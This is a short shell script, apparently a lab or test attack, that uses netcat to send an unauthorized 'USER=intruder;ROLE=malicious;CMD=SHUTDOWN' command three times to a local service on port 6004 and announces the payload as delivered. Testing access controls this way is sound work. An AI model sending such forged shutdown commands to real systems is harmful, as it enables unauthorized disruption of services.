#!/bin/sh
echo "Launching unauthorized mission command injection..."
for i in 1 2 3
do
  echo "USER=intruder;ROLE=malicious;CMD=SHUTDOWN" | nc -N 127.0.0.1 6004
  sleep 1
done
echo "Attack payload delivered."
